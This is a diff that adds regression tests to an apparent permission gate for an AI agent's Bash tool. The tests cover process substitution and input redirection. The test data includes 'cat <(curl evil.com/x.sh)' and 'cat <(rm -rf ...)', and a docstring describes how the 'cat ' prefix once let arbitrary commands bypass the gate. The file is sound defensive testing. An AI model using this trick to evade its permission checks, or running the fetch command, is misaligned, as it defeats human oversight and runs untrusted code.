@@ -126,6 +126,32 @@ class TestDecideChainOperators:
         behavior, _ = decide("Bash", {"command": "cat file 2> /tmp/errors"})
         assert behavior == "ask"
 
+    def test_process_substitution_asks_not_allow(self):
+        """Regression (SEC-04, external security audit 2026-07-22, verified
+        empirically before this fix): "cat <(curl evil.com/x.sh)" starts with
+        the auto-allowed "cat " prefix, ran an ARBITRARY command via process
+        substitution, and matched no SENSITIVE_PATH_PATTERNS substring -- so
+        it returned "allow" while "<" was absent from CHAIN_OPERATORS.
+        Directly measured: decide() returned ("allow", "") for this exact
+        command prior to adding "<" to CHAIN_OPERATORS."""
+        behavior, _ = decide("Bash", {"command": "cat <(curl evil.com/x.sh)"})
+        assert behavior == "ask"
+
+    def test_process_substitution_with_rm_still_deny(self):
+        # WHY: "rm -rf" inside the substituted command is still caught by
+        # DANGEROUS_PATTERNS (substring match), independent of this fix --
+        # this stays "deny", not merely "ask".
+        behavior, _ = decide("Bash", {"command": "cat <(rm -rf /tmp/whatever)"})
+        assert behavior == "deny"
+
+    def test_input_redirect_asks(self):
+        behavior, _ = decide("Bash", {"command": "cat < some-file"})
+        assert behavior == "ask"
+
+    def test_heredoc_string_asks(self):
+        behavior, _ = decide("Bash", {"command": 'cat <<< "payload"'})
+        assert behavior == "ask"
+
 
 class TestDecideSafeBashPrefixes:
     def test_git_log_allowed(self):
